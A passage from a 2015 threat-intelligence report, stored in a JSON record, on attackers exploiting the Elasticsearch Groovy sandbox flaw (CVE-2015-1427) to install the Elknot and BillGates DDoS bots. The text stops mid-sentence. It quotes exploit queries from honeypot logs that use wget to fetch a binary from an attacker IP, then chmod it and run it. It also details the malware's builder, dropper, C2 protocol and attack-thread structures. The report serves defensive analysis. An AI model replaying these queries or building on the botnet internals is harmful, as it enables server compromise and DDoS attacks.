{
    "id": "7031c7d9-f30f-4775-a70b-9948d2c831c3",
    "created_at": "2022-10-25T16:48:24.210717Z",
    "updated_at": "2025-03-27T02:14:34.107395Z",
    "deleted_at": null,
    "sha1_hash": "cefdd47d485ab9e5e9550849f6b92f706a8bce72",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-06-10T14:45:15Z",
    "file_modification_date": "2015-06-10T14:45:27Z",
    "file_size": 3643124,
    "plain_text": "# THE ELASTIC  BOTNET REPORT\n\nEXECUTIVE SUMMARY\nOn February 11, 2015, a vulnerability in Elasticsearch’s Groovy scripting engine was reported that\nallowed unauthorized attackers to submit malicious commands to vulnerable Elasticsearch instances,\nenabling an attacker to execute code on the victim’s server (see CVE-2015-1427[1]). Not long after\nthis disclosure, reports detailing large-scale scanning and exploitation of the vulnerability began to\nemerge, leading to a large number of compromised Elasticsearch servers with potentially sensitive\ninformation being exposed. Additional evidence suggests that the vulnerability, while publicly\nreported in 2015, was being actively exploited by attackers as of November 2014[2] and potentially\neven as early as July 2014[3].\n\nNovetta has collected and shares within this report evidence that suggests multiple actors,\npossibly working independently while sharing information between themselves, are exploiting the\nElasticsearch vulnerability primarily to establish widespread DDoS botnet infrastructures. Using\nboth the Elknot and BillGates DDoS malware, these attackers have continued to infect vulnerable\nElasticsearch servers in order to enhance their DDoS capabilities. The continuous scanning and\nexploitation of Elasticsearch servers is the most visible feature of these actors, and some actors have\ncontinued to infect and reinfect servers for weeks on end.\n\nThe Elknot and BillGates malware families differ greatly in their complexity but have a common\ncode base. Both of the malware families share a common author or authors, as code reuse is clearly\nobserved between the two. The Elknot malware appears to be the simpler of the two malware\nfamilies, using only the most basic of command sets in order to generate DDoS attacks. BillGates,\non the other hand, generates DDoS attacks while employing a more robust code base and feature\nset. For instance, BillGates will attempt to hide itself on a victim’s machine by proxying the Linux\ncommand line tools ‘ps’, ‘lsof’ and ‘netstat’ as a means of performing basic rootkit-like hiding.\nElknot does not attempt to retain persistence on a victim’s machine while BillGates goes to some\nlengths to stay on a victim server.\n\n_1 http://www.securityfocus.com/archive/1/archive/1/534689/100/0/threaded_\n\n_2_ _f_ _h_ _b_ _l_ _f_ _h_ _l_ _d (_ _)_\n\n\n-----\n\nNote that Elknot and BillGates do not perform the identification and exploitation of vulnerable\nElasticsearch servers; their installation is the byproduct of such actions, not the cause. Later in this\nreport we review some other observed artifacts that suggest that the actors behind this threat may\nleverage follow-up capabilities to maintain access to and control of select machines of interest to\nthem. At the very least, it appears the actors using Elknot and BillGates have developed an extensive\nDDoS botnet infrastructure based on the access granted by the Elasticsearch vulnerability, other\nremotely exploitable flaws, and/or SSH brute force attacks.\n\nThis report will briefly explore the Elasticsearch vulnerability and how it is being leveraged to infect\nvulnerable servers before detailing the inner workings of the Elknot and BillGates malware families\nto provide the reader with a fuller understanding of their capabilities and how they are related. A\ndetailed analysis of the techniques, tactics, and procedures (TTPs) used to deliver this malware is also\nprovided, particularly examining the scripts used to exploit vulnerable Elasticsearch servers as well\nas how the TTPs can link observed attack activity into larger patterns. Finally, this report will detail\nthe observed DDoS attack commands and how those commands can be interpreted by an analyst to\nprovide insight into the DDoS infrastructure operators.\n\n1. ELASTICSEARCH VULNERABILITY OVERVIEW\nThe Elasticsearch vulnerability is a relatively straightforward sandbox escape. Security researcher\nJordan Wright has developed and published a honeypot that captured the details of a vulnerable\nElasticsearch instance, and has even included logs of the activity his honeypot has observed which\nthis report uses below to demonstrate the attack process.\n\nThe infection of a vulnerable server begins by issuing a request to Elasticsearch similar to:\n\n{Server Address}/_search?\n\nsource=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22\nmatch%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22\nscript%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str\n%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20Input\nStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20\nhttp%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3B\nStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%\n28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D\n\nThe URL translates into the following decoded query:\n\n{“size”:1,\n“query”: {“filtered”:{“query”:{“match_all”:{}}}},\n“script_fields”:{“exp”:{“script”:”import java.util.*;import java.io.*;\nString str = \\”\\”;BufferedReader br = new BufferedReader(new\nInputStreamReader(Runtime.getRuntime().exec(\\”wget -O /tmp/xiaoma\nhttp://222.186.31.83:8080/xiaoma\\”).getInputStream()));StringBuilder sb = new\nStringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();”}}\n}\n\n_4 \u0007unisfreaxjp. “MMD-0021-2014 - China’s Elf (D)DoS + backdoor Malware“ http://blog.malwaremustdie.org/2014/05/linux-_\n_reversing-is-fun-toying-with-elf.html 12 May 2014_\n_5 \u0007Phenomite. “Sorting out a linut virtus -- Trojan Elknot DDoS Bot” http://phenomite.com/sorting-out-a-linux-virus/ 28 July 2014._\n_6 \u0007https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/_\n_b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log_\n\n\n-----\n\nAs a result of the above query, the victim’s machine, via the wget tool (if present on the system), places\na HTTP GET request to the server at 222.186.31.83 over port 8080 to download the file xiaoma[7] into its\n/tmp/ directory. In order to execute the downloaded malware, two additional queries occur as follows\n(using the same URL encoding as the first query mentioned above and decoded here for clarity):\n\n{“size”:1,\n“query”:{“filtered”:{“query”:{“match_all”:{}}}},\n“script_fields”:{“exp”:{“script”:”import java.util.*;\nimport java.io.*;\nString str = \\”\\”;BufferedReader br = new BufferedReader(new\nInputStreamReader(Runtime.getRuntime().exec(\\”chmod 777 /tmp/xiaoma\\”).\ngetInputStream()));StringBuilder sb = new StringBuilder();while((str=br.\nreadLine())!=null){sb.append(str);}sb.toString();”}}\n}\n\nThen,\n\n{“size”:1,\n“query”:{“filtered”:{“query”:{“match_all”:{}}}},\n“script_fields”:{“exp”:{“script”:”import java.util.*;\nimport java.io.*;\nString str = \\”\\”;BufferedReader br = new BufferedReader(new\nInputStreamReader(Runtime.getRuntime().exec(\\”nohup /tmp/xiaoma > /dev/null\n2>&1\\”).getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.\nreadLine())!=null){sb.append(str);}sb.toString();”}}\n}\n\nThe queries, respectively, make the /tmp/xiaoma file executable (via the chmod 777 command)\nand then execute the binary on the victim’s machine (via the nohup /tmp/xiaoma > /dev/null\n2>&1 command) as cataloged by the above example attacks. All of this activity is surprisingly\nstraightforward and simple to automate for an attacker.\n\nDuring the course of Novetta’s investigation into the use of the Elasticsearch vulnerability, two\ndifferent malware families (Elknot and BillGates) were found being installed by multiple potentially\nrelated actors; both families are DDoS bots and both families have a shared lineage. Additionally, a\nthird malware family (Linux/AES.DDoS) was observed attempting to be installed by a single actor.\n\n_7 Pinyin for the Chinese word “pony”._\n\n\n-----\n\n2. ELKNOT FAMILY ANALYSIS\nNovetta has observed two subfamilies of the Elknot malware being deployed in relation to the\nElasticsearch attacks. The first subfamily of Elknot is a two-stage binary consisting of a dropper\nbinary (“the dropper”) and its embedded payload (“the payload”). The second subfamily of Elknot is\na single-stage binary, which itself consists of two variants (“Variant A” and “Variant B”). The payload\nof the Elknot dropper subfamily matches Variant A of the Elknot payload subfamily. Despite the\ncommonalities between the Elknot subfamilies (and their variants), the two subfamilies of Elknot\nhave been segregated because they represent not only different deployment methods, but also use\ndifferent builders as illustrated below.\n\nThe following sections will analyse the dropper subfamily’s binary, the binaries of payload subfamily’s\nVariant A and Variant B, as well as key details regarding the dropper’s builder (“the builder”).\n\n2.1 DROPPER’S BUILDER ANALYSIS\n\n\nSource Samples SHA-256s:\n185251b437d3935a5d6e92a49e07a3c2f95289156a6bbe54df3cb771d78affa3,\n0c9107b2742705fa1834fd7e8beaa3778f6f1ba1e38fd3eb30b1aeac30c7a1de,\n58d7343dfa554e8847c8d3ff07ef4b2a449c57c426a0ba62584d6deb06992842,\n62fa123912eaa226babe46a6adef06638432fa2b3758c1e3cc7aca873c947fe6\n\n\n-----\n\nResearchers Peter Kálnai and Jaromír Hořejší at Avast identified several builders for the Elknot\nmalware that produced the payload subfamily’s Variant B binaries (known as Elknot’s Chicken Builder)\nas well as the dropper’s binaries (referred to as the Elknot Text-box Builders). An interesting feature of\nthe Elknot Text-box Builders and their resulting dropper subfamily binaries is that the builder allows an\nattacker to specify only one C2 address, yet, as seen in the next section, the dropper subfamily binaries\ndeploy two identical Elknot binaries that only differ in their (potentially different) C2 addresses.\n\nThe configuration data within the dropper, as well as the builder, takes the following form:\n\nstruct Config\n{\nunsigned int magic; // Magic DWORD value\nchar szFirstC2[256]; // First C2 address string\nchar szSecondC2[256]; // Second C2 address string\nunsigned int dwIPOffset; // Offset to C2 address in drop file\nchar szFirstC2Port[16]; // First C2 port string\nchar szSecondC2Port[16]; // Second C2 port string\nunsigned int dwPortOffset; // Offset to C2 port in drop file\nchar szExecName[64]; // Name to execute drop file as\nunsigned int dwSleepDelay; // Delay in seconds between first\n// and second file drop\n};\n\nThe Config structure provides fields for the specification of two C2 servers, however, as noted, the\nText-box Builder only allows the user of the builder to alter one of the C2 server configurations. This is\nmost easily illustrated by looking at the following code snippet the builder uses to apply the actor’s C2\naddress and port to a new Elknot dropper binary:\n\nConfig templateConfig, marker;\nv6 = GetFileSize(v3, 0);\nConfig *pTemplateConfig = FindMarker(hTemplateFile, (char *)hTemplateFile + v6 - 1,\n&marker, 4u);\nif ( pTemplateConfig )\n{\nqmemcpy(&templateConfig, pTemplateConfig, sizeof(templateConfig));\nqmemcpy(marker.szSecondC2, templateConfig.szSecondC2, sizeof(marker.szSecondC2));\nqmemcpy(marker.szSecondC2Port, templateConfig.szSecondC2Port, sizeof(marker.\nszSecondC2Port));\nqmemcpy(marker.szExecName, templateConfig.szExecName, sizeof(marker.szExecName));\nmarker.dwSleepDelayInSeconds = templateConfig.dwSleepDelayInSeconds;\nqmemcpy(pTemplateConfig, &marker, 0x270u);\n\n_8 \u0007Peter Kálnai and Jaromír Hořejší .“Chinese Chicken: Multiplatform DDoS Botnets”. 3 December 2014._\n_https://www.botconf.eu/wp-content/uploads/2014/12/2014-2.10-Chinese-Chicken-Multiplatform-DDoS-Botnets.pdf_\n\n\n-----\n\nIn the code snippet above the builder is using the Config from the template file (a dropper subfamily\nsample) and only replacing the information for the second C2 address. This means that an actor\nusing one of these builders will always share an infected machine with an unknown secondary actor.\nAlthough unclear who the secondary actor is in this case, it is most likely the one who originally\ndistributed the builder. By distributing the builder, the unknown, secondary actor can effectively\nestablish an infection base without ever having to perform a single infection themselves.\n\nThe builders contain a copy of the UPX executable packing tool within their resources. The builder\nwill attempt to pack the newly minted dropper binary using UPX to reduce its size and potentially to\nobfuscate the configuration.\n\n2.2 THE DROPPER SUBFAMILY BINARY ANALYSIS\n\n\nSource Sample SHA-256:\nb11a6bd1bcbb759252fb252ee1122b68d44dcc275919cf95af429721767c040a\n\n\nThe dropper subfamily samples are a statically linked and stripped gcc-compiled binary that contains\nan embedded copy of an Elknot payload Variant A binary. The dropper can take 0, 1 or 2 arguments. If\nthe file is executed without any arguments, it does the following:\n\n1. Obtains the name of itself via /proc/self/exe\n\n2. \u0007Copies itself to the file named in the builder’s Config.szExecName by executing:\ncp _{the name of the binary from /proc/self/exe} {name specified in Config.szExecName}_\n\n3. \u0007Executes itself as: {name specified in Config.szExecName} {path of original binary}/{name\n_specified in Config.szExecName} 1_\n\n4. \u0007Copies itself as its original name but with an “a” appended using: cp _{the name of the binary from_\n/proc/self/exe} {the name of the binary from /proc/self/exe}a\n\n5. Deletes the original binary\n\nIf the dropper is executed with 2 arguments, it does the following:\n\n1. Opens a file handle to file named in the Config.szExecName field.\n\n2. \u0007Copies an approximately 1.4Meg buffer from itself to the filename specified by the\nConfig.szExecName field.\n\n3. \u0007Overwrites the C2 address of the new binary with the encrypted string from the\nConfig.szSecondC2 field.\n\n4. \u0007Overwrites the C2 port of the new binary with the encrypted string from the\nConfig.szSecondC2Port field.\n\n5. Marks the file as executable and executes the file.\n\n6. Deletes the new file after it begins execution.\n\n\n-----\n\nIf the dropper is executed with 1 argument, it does the following:\n\n1. Takes the process’s first argument as the name of the file to drop and opens a file handle to it.\n\n2. \u0007Copies an approximately 1.4Meg buffer from itself to the drop file specified by the\nConfig.szExecName field.\n\n3. Overwrites the C2 address of the binary with an encrypted string from the Config.szFirstC2 field.\n\n4. Overwrites the C2 port of the binary with the encrypted string from the Config.szFirstC2Port field.\n\n5. Marks the file with a +x attribute before executing it\n\n6. Copies the source binary back over the original process’s file\n\n7. Deletes the file\n\nA key aspect of the samples within the Elknot dropper subfamily’s behavior is that two versions of\nthe same Elknot payload binary are running simultaneously on the infected server. Each version of\nthe payload Variant A binary reports to potentially different IP addresses. The Elknot Text-box Builder\nresponsible for constructing these dropper Elknot binaries only allow a single IP address to be userconfigurable while the second IP address is hardcoded, as described in the previous section. The\nresult of the dropper’s behavior is visually depicted in the image below.\n\nOne more aspect of the dropper subfamily is worth mentioning briefly: at the binary file format level\nand code level the dropper subfamily samples significantly differ from the payload subfamily samples.\nAs explained later in this report, the BillGates and Elknot malware have a common, noticeable shared\ncode base. The Elknot dropper subfamily samples, however, do not demonstrate any code similarity\nor code overlaps with either BillGates or the rest of the Elknot subfamilies and Variants, indicating\nthat the two components contained within the dropper subfamily were written by different authors.\n\nThe authors of the Elknot dropper did not provide any means for persistence after a reboot, and\nonce the victim’s machine is rebooted by an administrator, or system crash, the infection ceases.\nWhile most production servers typically do not experience frequent restarts, it is interesting that the\nauthors did not provide any means to regain control over the victim’s machine. Evidence presented\nlater in this report demonstrates that it is not uncommon for the actors using Elknot to continually reinfect a vulnerable server, thereby negating the need for persistence. Given the infrequent nature of\nrebooting servers hosting Elasticsearch software as well as the easily deployed nature of cloud based\nservices with pre-installed Elasticsearch versions, it stands to reason that this method of continual\nscanning and reinfection provides the attackers access to a solid and continually evolving set of\ninfected machines.\n\n\n-----\n\n2.3 ELKNOT PAYLOAD SUBFAMILY MALWARE ANALYSIS\n\n\nSource Sample SHA-256:\n0b95195662f456c816c2729457fe9b430eac191a6d27e6e05e2dae4a4131b6fe [Variant A]\n6959ff4259f0478f7040fc0233af35a8ae4a24fa2fddadd3893cf95248a9eba6 [Variant A]\n6ee9c50c2b051277258f139ddd9190ad8f395889d0ea2cec2508b2f21857cfec [Variant B]\n\n\nThe Elknot payload subfamily (or simply “the Elknot malware”), which is either dropped and executed\nby an Elknot dropper or run by itself, is a gcc-compiled binary with the runtime library statically\nlinked. Novetta found two variants of the payload subfamily of Elknot malware. The two variants are\nfunctionally identical in all areas except for the portion of the code responsible for generating and\nperforming the actual DDoS attacks. This section will describe the the payload subfamily’s operation\nwhile drawing attention to the differences, whenever present, between Variant A and Variant B.\n\nUnlike the dropper subfamily, the authors did not strip function names and other metadata from\nthe binary, providing a wealth of information. The payload binaries are heavily C++ based with a\nrather surprising level of development evident. The source code for the Elknot binary consists of 20\nindividual .cpp files, laid out in such a way that each file contains a single class that contributes to the\noverall Elknot malware.\n\nInterestingly, the authors included three source files for code that are never utilized (Log.cpp for the\nCLog class, FileOp.cpp for the CFileOp class, and Md5.cpp for the CMd5 class). Furthermore, the\nNetBase.cpp file contains the CNetBase class which contains significantly more functionality than\nElknot malware utilizes for network communication. The unused code (and classes) is most likely a\nbyproduct of the fact that the source code on which Elknot is based also contributes to the BillGates\nbot. Both Elknot and BillGates share common code indicating that the authors of each had access\nto the same set of source code libraries. Given the nature of the shared code and TTPs used by the\nactors leveraging this code base, Novetta expects future variants of this codebase to be developed\nwith the same, similar, or derived capabilities.\n\nFrom the initial entry point, the code clearly exhibits a very streamlined approach as evidenced by the\nmain function:\n\nint main(int argc, const char **argv, const char **envp)\n{\nif ( daemon(1, 0) >= 0 )\n{\nCStatBase::Initialize(&g_statBase);\nCServerIP::Initialize(&g_Servers);\nCManager::StartNetProcess(&g_Manager);\n}\nreturn 0;\n}\n\n\n-----\n\nThe CStatBase class captures information about the victim machine including:\n1) \u0007system version via uname(). This includes the system name and the release info\n(from CStatBase::GetSysVersion).\n\n2) the CPU speed via /proc/cpuinfo parsing (from CStatBase::GetCpuSpd)\n\n3) \u0007the number of user mode, niced and kernel processes via /proc/stat parsing\n(from CStatBase::InitGetCPUUse and CStatBase::GetCPUUse)\n\n4) \u0007network statistics via parsing /proc/net/dev (from CStatBase::InitGetNetUse and\nCStatBase::GetNetUse)\n\nThe CServerIP class encapsulates the information about a group of C2 servers using an STL map. The\nCServerIP class appears to only use one hardcoded IP. The IP address and port are encrypted in the\nsame manner as found in the dropper (though the dropper never actually decrypts the information).\nThe encoding scheme is a simple increment or decrement of each byte based on the position of\nthe byte relative to the starting position. Simply put, starting at byte 0, if the position of the byte\nbeing decrypted is even, the byte is decremented by one; otherwise the byte is incremented by one.\nFor example, if the encrypted string is “:2/024/77-3/:”, the algorithm translates the string into\n93.115.86.209.\n\nAfter initializing the CStatBase and CServerIP objects, the main loop begins when\nCManager::StartNetProcess is invoked. CManager is the encapsulating object for the bulk\nof the malware’s operation. Given that the object is static and global, it is initialized by calling\nCManager::CManager as part of the __libc_csu_init startup function. As part of the initialization\nof the CManager object, various additional classes are instantiated and initialized. Notably, the\nCThreadAttack class is instantiated 20 times, but left in an idle state; this object will be further\nexamined later in this report.\n\nCManager::StartNetProcess begins by calling CFake::Initialize. CFake::Initialize looks for a\nfile called fake.cfg within the same directory as the malware on the victim’s machine. The fake.cfg\nfile is a text file containing state information in the following structure:\n\n{decimal number}\n{IP Address}:{IP Address}\n{Port Number}:{Port Number}\n{Remarks}\n\nThe CFake object, as seen in memory, takes the following form:\n\nstruct CFake\n{\nstd::string strSaveFileName;\nCSubTask cLastTaskInfo;\nCThreadMutex cAccessLock;\n}\n\nThe CFake object, at its core, revolves around the CSubTask object. The CSubTask object defines a\nspecific task (attack) that Elknot is to perform. CSubTask, as will be explained later, is heavily used by\nCThreadAttack for directing any given operation defined by the C2 server. The CSubTask object, as\nseen in memory, takes the following form:\n\n\n-----\n\nstruct CSubTask\n{\nunsigned char taskType; // typically defines the “attack” type\nchar gap[3]; // memory alignment, unused\nunsigned int dwTargetIP; // IP address to send packets to\nunsigned short wTargetPort; // Port to send packets to\nunsigned short gap2; // memory alignment, unused\nunsigned int dwThreadCnt; // Number of threads for task\nunsigned int dwStartDelay; // delay (in second)\nunsigned int dwTaskDuration; // Duration of attack\nunsigned int dwMinSize; // Min. packet data size\nunsigned int dwMaxSize; // Max. packet data size\nunsigned short wStartPort; // Starting source port\nunsigned short wEndPort; // Ending source port\nunsigned int dwStartIP; // Starting (fake) source IP address\nunsigned int dwEndIP; // Ending (fake) source IP address\nint unknown3; // Unknown variable set by C2\nstd::string strActorRemarks; // Base domain\n}\n\nCFake will generate the CSubTask information from the data collected from the fake.cfg file. The first\ndecimal number within the fake.cfg file determines if CSubTask.unknown3 is set to 0 (if the decimal\nnumber is zero) or 1 (if the decimal number is non-zero). The IP Address fields in fake.cfg make up\nthe values (after calling inet_addr on each value) for CSubTask.dwStartIP and CSubTask.dwEndIP,\nin that order. The Port Number fields make up the values for wStartPort and wEndPort, in that order.\nLastly, the Remarks field determines the value of CSubTask.strActorRemarks.\n\nIf the fake.cfg file does not exist on the victim’s machine, CFake::Initialize may generate a\ngeneric file with the following values and save the content to fake.cfg:\n\n0\n{IP of Victim Machine}:{IP of Victim Machine}\n10000:60000\n{blank line}\n\nAfter initializing the CFake object, CManager::StartNetProcess calls\nCThreadMessageList<CCmdMessage>::Initialize which, as the name suggests, initializes the list\nof CCmdMessage objects. CCmdMessage objects are used by CManager for passing tasks to the various\nCThreadAttack threads. The message-passing system is one of the more visible examples within\nElknot that demonstrates the level of development sophistication on the part of the authors.\n\nEach CCmdMessage consists of an 8-byte data structure defined as:\n\nCCmdMessage\n{\nunsigned int dwMsgType; // Defines the type of message\nCLoopTask *pcTask; // Task associated with the message\n}\n\n\n-----\n\nThere are 2 types of messages currently implemented within Elknot:\n\n**dwMsgType VALUE** **MEANING**\n\n1 Add new task to the queue (found in pcTask)\n\n2 Stop the current task (if only one) and send back\na status update to the C2 or stop all tasks (if more\nthan one) quietly\n\nCCmdMessage.dwMsgType messages with a value of 1 will contain a pointer to a CLoopTask object.\nCLoopTask objects contain a set of CSubTask objects that define the sequence of attacks that\nCThreadAttack will perform as explained later in the “CThreadAttack Object” section. CLoopTask\nhas the following structure when in memory:\n\nstruct CLoopTask\n{\nunsigned char unknown1; // Unknown variable set by C2\nunsigned char gap3[3]; // Memory alignment\nunsigned int dwTaskID; // Identifier of task set\nunsigned int dwLoopDelay; // Delay between CSubTask executions\nunsigned int dwExecutionCount; // Number of times to execute each task\nstd::vector<CSubTask> tasks; // Array of tasks to perform\n}\n\nThe marshalling of tasks from the CThreadMessageList object (which contains the list of\nCCmdMessage objects) to the CThreadAttack threads is handled by the CThreadTaskManager\nobject. As it turns out, the CThreadTaskManager object is little more than a proxy for\nthe CManager::StartTaskProcess function. Within CManager::StartTaskProcess,\nthe CManager object will continuously query the list of messages within the message\nqueue (which is typed as CThreadSignaledMessageList<CCmdMessage>) by calling\nthe CThreadSignaledMessageList<CCmdMessage>::MessageRecv function. The\nCThreadSignaledMessageList<CCmdMessage>::MessageRecv function looks in the list of messages\nfor any message that is currently “non-signaled,” meaning it has not been activated, and returns\nthe associated CCmdMessage object. The end result is that CManager::StartTaskProcess will take\nthe next available, non-signaled CCmdMessage from the message queue and process the message.\nDepending on the CCmdMessage.dwMsgType value, CManager::StartTaskProcess will either start\na new task by passing the CLoopTasks object to a CThreadAttack object or stop any and all active\nCThreadAttack threads. It is the complexity of this particular system that indicates that the authors of\nElknot have a better than rudimentary grasp of complex program design and may have a good deal\nof experience with performance-oriented network scanning or network-based DoS attacks.\n\nWith the messaging system initialized, CManager::StartNetProcess initializes the status update\nsubsystem that is contained within the CThreadHostStatus object. Activated as a thread,\nCThreadHostStatus, via its ProcessMain function, is responsible for recording periodic updates about\nthe status of the Elknot malware via a TaskStatus structure contained within the CManager object.\nAfter waiting 4 seconds for the Elknot malware to fully initialize, CThreadHostStatus::ProcessMain\nwill update the current state of the malware once every second. The update occurs by calling\nCManager::SendTaskStatus while passing along a CSubTask object with the CSubTask.taskType\nvalue set to -1 as well as the current CPU and network interface utilization as defined by the calls to\nCStatBase::GetCPUUse and CStatBase::GetNetUse, respectively. The CManager::SendTaskStatus\nfunction updates the TaskStatus which has the following structure in memory:\n\n\n-----\n\nstruct TaskStatus\n{\nunsigned int dwTaskID; // set to CLoopTask.dwTaskID\nunsigned int dwSubTaskID; // The current CSubTask index\nunsigned int dwIterationCnt; // The current execution cycle of task\nunsigned char cTaskType; // type of task (set to CSubTask.taskType)\nunsigned char gap3[3]; // alignment\nunsigned int dwTargetIP; // IP of transmission endpoint\nunsigned short wTargetPort; // Port of transmission endpoint\nunsigned short gap2; // alignment\nunsigned int dwCPUUsage; // current load on the CPU\nunsigned int dwNetUsage; // current number of bytes transmitted\n}\n\nThe TaskStatus data is sent to the C2 whenever the CManager::SendTaskStatus function is called.\nCManager::SendTaskStatus is called whenever the C2 issues a command (see the discussion below\nregarding C2 communication commands). Whenever CManager::SendTaskStatus is called, the function\ntransmits the TaskStatus information to the C2 over a cleartext socket in the following format:\n\nstruct TaskStatusNetworkBurst\n{\nunsigned int dwTaskID; // TaskStatus.dwTaskID\nunsigned int dwSubTaskID; // TaskStatus.dwSubTaskID\nunsigned int dwIterationCnt; // TaskStatus.dwIterationCnt\nunsigned char cTaskType; // TaskStatus.cTaskType\nunsigned int targetIP; // TaskStatus.dwTargetIP\nunsigned short targetPort; // TaskStatus.wTargetPort\nunsigned int cpuUsage; // TaskStatus.dwCPUUsage\nunsigned int netUsage; // TaskStatus.dwNetUsage\n}\n\nGiven that the TaskStatus structure is updated at intervals of one second, the C2 does not receive a\nrealtime update of each of the Elknot infections, as the data bursts to the C2 server are C2-driven, not\nmalware-driven.\n\nAs the final step in the initialization before contacting the C2 server, CManager::StartNetProcess\nactivates each of the 20 CThreadAttack threads at one time. With the initialization of the CManager\ncomplete, CManager::StartNetProcess begins the process of establishing a connection to and\nprocessing command from the C2 server.\n\nCManager queries the CServerIP map looking for C2 address information. Once found, CManager\nattempts to resolve the C2 address. With a valid C2 address, CManager then attempts to connect to\nthe C2 server over TCP. If any of these steps fail, CManager will begin again by looking for another C2\naddress in the CServerIP map. Once connected to the C2, CManager sends a beacon to the C2 server\nof exactly 401 bytes. The content of the beacon consists of various fields from the CFake object, the\nversion of the operating system, and the victim’s machine name. The structure of the beacon takes\nthe following form in both memory and as it traverses the network in plaintext:\n\n\n-----\n\nstruct Beacon\n\n{\nunsigned int dwCPUSpeed; // Current speed of the CPU in MHz\nunsigned char unknown1; // CFake.cLastTaskInfo.unknown3 != 0\nunsigned int dwStartIP; // CFake.cLastTaskInfo.dwStartIP\nunsigned int dwEndIP; // CFake.cLastTaskInfo.dwEndIP\nunsigned short wStartPort; // CFake.cLastTaskInfo.wStartPort\nunsigned short wEndPort; // CFake.cLastTaskInfo.wEndPort\nchar szVictimVerInfo[128]; // value from CStatBase::GetSysVersion\nchar szActorRemarks[255]; // CFake.cLastTaskInfo.strActorRemarks\n}\n\nWith the beacon transmitted, CManager enters an infinite communication loop where CManager reads\nfour bytes (a DWORD) from the C2 server (in plaintext) and dispatches the appropriate handler that\ncorresponds to the DWORD received. CManager will only respond to a DWORD within the range of 1\nto 4; any value outside of this will cause the communication loop to begin anew.\n\nThe following DWORD values correspond to the described commands:\n\n**DWORD from C2** **COMMAND DESCRIPTION**\n\n1 Receive new CFake values from C2 server and\nrecord to disk (via CManager::ReadFake)\n\n2 Receive new task from the C2 server\n\n3 Terminate active tasks (via\nCManager::StopTask) and send TaskStatus\n(via CManager::SendTaskStatus)\n\n4 Send the current TaskStatus (via\nCManager::SendTaskStatus)\n\nWhenever a new task is received from the C2 server (via the 2 command), a new CCmdMessage object\nis generated and passed to CManager::ReadTask. CManager::ReadTask will read 4 bytes (as a\nDWORD) from the open network socket and then allocate that much memory. A second read from\nthe network fills the buffer with the data necessary to generate a CLoopTask structure. The buffer\ncontains the CLoopTask values in the following format:\n\nstruct CLoopTaskNetworkFormat\n{\nunsigned char unknown1; // CLoopTask.unknown1\nunsigned int dwTaskID; // CLoopTask.dwTaskID\nunsigned int dwLoopDelay; // CLoopTask.dwLoopDelay\nunsigned int dwExecutionCnt; // CLoopTask.dwExecutionCnt\nunsigned int dwSubTaskCount; // Number of CSubTask records to follow\n}\n\n\n-----\n\nFollowing the CLoopTaskNetworkFormat structure are zero or more CSubTask records in the following\nmemory and network structure:\n\nstruct CSubTaskNetworkFormat\n{\nunsigned char taskType; // The “attack” type\nunsigned int dwTargetIP; // IP address to send packets to\nunsigned short wTargetPort; // Port to send packets to\nunsigned int dwThreadCnt; // Number of threads for task\nunsigned int dwStartDelay; // Delay (in seconds) before starting\nunsigned int dwTaskDuration; // Duration of attack\nunsigned int dwMinSize; // Min. packet data size\nunsigned int dwMaxSize; // Max. packet data size\nunsigned short wStartPort; // Starting source port\nunsigned short wEndPort; // Ending source port\nunsigned int dwStartIP; // Starting fake source IP address\nunsigned int dwEndIP; // Ending fake source IP address\nint unknown3; // Unknown variable set by C2\nchar szDomain[]; // Base domain\n}\n\nCManager::StartNetProcess queues the message by calling\nCThreadSignaledMessageList<CCmdMessage>::MessageSend. At this point, the new task is ready\nfor execution by the CThreadAttack objects.\n\n2.4 CThreadAttack OBJECT\nThe CThreadAttack object, the workhorse object of the Elknot malware, contains a system for\nsending specially crafted packets to remote computers utilizing UDP [Variants A and B] as well\nas TCP and ICMP [Variant B]. Whenever CManager::StartTaskProcess finds a new CCmdMessage\nwithin the CThreadSignaledMessageList<CCmdMessage> object, and the dwMsgType is set to 1,\nCThreadAttack::Start is called with the CCmdMessage object. CThreadAttack::Start adds the\nCLoopTask to the task list of the CThreadAttack and sets the CThreadAttack.condTaskReadyForLaunch\nflag indicating that a new task is ready for execution by CThreadAttack.\n\nAs part of the initialization of Elknot, CManager::StartNetProcess activates 20 CThreadAttack\nobjects, which results in each of the CThreadAttack object’s ProcessMain function being\ncalled. The CThreadAttack::ProcessMain function begins by initializing a CThreadTimer\nobject, which CThreadAttack utilizes for signaling hung threads to prevent a deadlock as well\nas timing out tasks that have a defined execution lifespan (CSubTask.dwTaskDuration). The\nCThreadAttack::ProcessMain enters an infinite loop that begins by calling CThreadCondition::Wait\nagainst the condTaskReadyForLaunch, a CThreadCondition object. The CThreadCondition object\nis an atomic flag indicating if the CThreadAttack object has been given any tasks to perform.\nThe CThreadCondition::Wait function, in this case, is responsible for pausing execution of the\nCThreadAttack object’s thread until there is a task to perform. The use of the CThreadCondition\nobject allows each CThreadAttack object to wait an indefinite period of time for a new task while\nlimiting the resources the object consumes when the object has no work waiting.\n\nOnce at least one new task is found waiting for the CThreadAttack object,\nCThreadAttack::ProcessMain will loop through the waiting tasks (contained within CLoopTask\nobjects) until a CLoopTask.dwExecutionCount value is found greater than 0. Once such a task is\n\n\n-----\n\nfound, CThreadAttack::ProcessMain enters another loop where each of the CSubTask tasks are\nprocessed in sequence. For each CSubTask found, a call to CManager::SendTaskStatus is made to\nupdate the global TaskStatus, followed by a call to CThreadAttack::PktAtk.\nCThreadAttack::PktAtk performs the actual data transmission from the victim’s machine to 